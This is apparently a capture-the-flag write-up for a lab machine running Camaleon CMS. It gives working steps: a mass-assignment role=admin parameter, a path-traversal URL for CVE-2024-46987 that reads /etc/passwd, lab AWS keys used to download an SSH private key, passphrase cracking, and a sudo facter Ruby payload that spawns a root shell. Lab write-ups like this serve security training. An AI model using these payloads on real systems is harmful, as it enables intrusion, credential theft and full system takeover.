1. Enumeration

First, add the target to /etc/hosts:

echo "10.10.X.X facts.htb" | sudo tee -a /etc/hosts


Run directory enumeration:

feroxbuster -u http://facts.htb/


While browsing the application, a password update functionality was discovered.

2. Parameter Manipulation

Intercepting the password update request reveals:

&password%5Bpassword%5D=egw&password%5Bpassword_confirmation%5D=egw


Decoded:

password[password]=egw
password[password_confirmation]=egw


This suggests additional parameters may be accepted.

Appending:

&password[role]=admin


Resulted in privilege escalation within the application.

3. CVE Discovery – Path Traversal

The CMS version was identified as:

Camaleon CMS 2.9.0


This version is vulnerable to:

CVE-2024-46987 – Arbitrary Path Traversal

Exploit:

http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd


This confirms file disclosure via path traversal.

From /etc/passwd, the following non-standard users were identified:

william

trivia

_lauren

4. User Flag

Attempting to read William’s home directory:

http://facts.htb/admin/media/download_private_file?file=/home/william/user.txt


The user flag was successfully retrieved.

5. AWS S3 Enumeration

While reviewing CMS configuration files, AWS credentials were discovered.

Configure AWS CLI:

aws configure

AWS Access Key ID: AKIA55A02DA8320B27B5
AWS Secret Access Key: mg1ErEFKwETZFqAUrB0pTAMI8CVwUfIkjSfNiK4I
Region: us-east-1
Output format: json


Enumerate buckets:

aws s3 ls --endpoint-url http://facts.htb:54321


Discovered buckets:

internal

randomfacts

The internal bucket appeared particularly interesting.

5.1 Exploring the Internal Bucket

List contents:

aws s3 ls s3://internal/ --endpoint-url http://facts.htb:54321


Observed:

.ssh/

.bundle

.cache

.bashrc

.profile

List .ssh contents:

aws s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321


Download private key:

aws s3 cp s3://internal/.ssh/id_ed25519 ./ --endpoint-url http://facts.htb:54321


Set correct permissions:

chmod 600 id_ed25519

6. SSH Key Cracking

Convert key to hash:

ssh2john id_ed25519 > ssh.hash


Crack with John:

john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt


Recovered passphrase:

dragonballz

7. SSH Access

Login as trivia:

ssh -i id_ed25519 trivia@facts.htb


Access obtained as user trivia.

8. Privilege Escalation

Transfer linpeas:

scp -i id_ed25519 /usr/share/peass/linpeas/linpeas.sh trivia@facts.htb:/home/trivia


Make executable and run:

chmod +x linpeas.sh
./linpeas.sh

8.1 Sudo Privileges

Check sudo permissions:

sudo -l


Output:

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter

9. Exploiting Facter

facter allows loading custom Ruby facts.

Attempting to use FACTERLIB fails due to sudo restrictions:

sudo FACTERLIB=/tmp /usr/bin/facter pwn


However, facter supports the --custom-dir argument.

Create malicious Ruby file:

echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/pwn.rb


Execute:

sudo /usr/bin/facter pwn --custom-dir /tmp


Root shell obtained.

10. Root Access

Privilege escalation was achieved due to:

Misconfigured sudo permissions

Ability to execute arbitrary Ruby code via facter --custom-dir
And just like that, I was root.
